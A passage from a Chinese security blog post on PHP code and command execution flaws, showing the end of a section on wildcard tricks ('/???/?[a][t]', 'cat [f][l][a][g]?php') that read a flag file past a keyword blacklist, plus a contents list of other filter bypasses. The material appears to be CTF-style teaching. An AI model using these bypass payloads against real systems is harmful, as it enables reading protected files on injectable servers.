+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;error&#39;&gt;1234.php </span><br><span class="line">&#x2F;???&#x2F;?[a][t] ?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;?&#39;&#39;p</span><br><span class="line">error</span><br><span class="line">!!flag</span><br></pre></td></tr></table></figure>
+
+<p>所以还可以这样使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat [f][l][a][g]?php</span><br><span class="line">!!flag</span><br></pre></td></tr></table></figure>
+
+<p>关于linux下通配符可以看<a href="https://www.cnblogs.com/lixuwu/p/7816335.html" target="_blank" rel="noopener">Linux文件名匹配</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>atsud0
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://atsud0.me/2020/05/30/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="代码-命令执行漏洞">http://atsud0.me/2020/05/30/远程代码-命令执行/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Windows/" rel="tag"><i class="fa fa-tag"></i> Windows</a>
+              <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a>
+              <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag"><i class="fa fa-tag"></i> 命令执行</a>
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" rel="tag"><i class="fa fa-tag"></i> 代码执行</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/05/27/XXE%E7%AC%94%E8%AE%B0/" rel="prev" title="XXE笔记">
+      <i class="fa fa-chevron-left"></i> XXE笔记
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/05/30/Bolt-CMS-3-7-0-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" rel="next" title="Bolt CMS 3.7.0 身份认证远程代码执行">
+      Bolt CMS 3.7.0 身份认证远程代码执行 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#php代码执行漏洞相关函数"><span class="nav-number">1.</span> <span class="nav-text">php代码执行漏洞相关函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#eval"><span class="nav-number">1.1.</span> <span class="nav-text">eval</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#assert"><span class="nav-number">1.2.</span> <span class="nav-text">assert</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#preg-replace"><span class="nav-number">1.3.</span> <span class="nav-text">preg_replace</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call-user-func"><span class="nav-number">1.4.</span> <span class="nav-text">call_user_func</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#a-b-动态函数"><span class="nav-number">1.5.</span> <span class="nav-text">$a($b)动态函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令执行"><span class="nav-number">2.</span> <span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#命令执行漏洞相关函数"><span class="nav-number">2.1.</span> <span class="nav-text">命令执行漏洞相关函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exec"><span class="nav-number">2.1.1.</span> <span class="nav-text">exec()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#system"><span class="nav-number">2.1.2.</span> <span class="nav-text">system()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#shell-exec"><span class="nav-number">2.1.3.</span> <span class="nav-text">shell_exec()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反引号"><span class="nav-number">2.1.4.</span> <span class="nav-text">反引号&#96;&#96;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#passthru"><span class="nav-number">2.1.5.</span> <span class="nav-text">passthru</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#popen-command-mode"><span class="nav-number">2.1.6.</span> <span class="nav-text">popen(command,mode)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#命令连接符"><span class="nav-number">2.1.7.</span> <span class="nav-text">命令连接符</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令和代码执行的本质"><span class="nav-number">3.</span> <span class="nav-text">命令和代码执行的本质</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一些绕过方法"><span class="nav-number">4.</span> <span class="nav-text">一些绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux的命令执行中当空格被过滤"><span class="nav-number">4.1.</span> <span class="nav-text">Linux的命令执行中当空格被过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#IFS-代替空格-bash"><span class="nav-number">4.1.1.</span> <span class="nav-text">${IFS}代替空格(bash)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lt-gt-重定向符代替"><span class="nav-number">4.1.2.</span> <span class="nav-text">&lt;&gt;重定向符代替</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#突破黑名单绕过"><span class="nav-number">4.2.</span> <span class="nav-text">(突破黑名单绕过)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#拼接"><span class="nav-number">4.2.1.</span> <span class="nav-text">拼接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#base64-编码"><span class="nav-number">4.2.2.</span> <span class="nav-text">base64 编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用单引号-双引号-反斜杠"><span class="nav-number">4.2.3.</span> <span class="nav-text">使用单引号,双引号,反斜杠</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用一个内容为空的变量名"><span class="nav-number">4.2.4.</span> <span class="nav-text">使用一个内容为空的变量名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#通配符绕过"><span class="nav-number">4.2.5.</span> <span class="nav-text">通配符绕过</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="atsud0"
+      src="https://images.atsud0.me/images/atsud0-avator.jpg">
+  <p class="site-author-name" itemprop="name">atsud0</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">128</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/index.html">
+          
+        <span class="site-state-item-count">166</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/atsud0" title="GitHub → https://github.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:admin@atsud0.me" title="E-Mail → mailto:admin@atsud0.me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/atsud0" title="Twitter → https://twitter.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/MindworkshopBot" title="Telegram → https://t.me/MindworkshopBot" rel="noopener" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ajin.cloud/" title="https://blog.ajin.cloud/" rel="noopener" target="_blank">ajin</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://leiblog.wang/" title="https://leiblog.wang/" rel="noopener" target="_blank">LeiWang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://esonhugh.github.io/" title="https://esonhugh.github.io/" rel="noopener" target="_blank">Esonhugh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://isabellainori.github.io/" title="https://isabellainori.github.io/" rel="noopener" target="_blank">Isabella Ross</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">atsud0</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">407k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">6:10</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
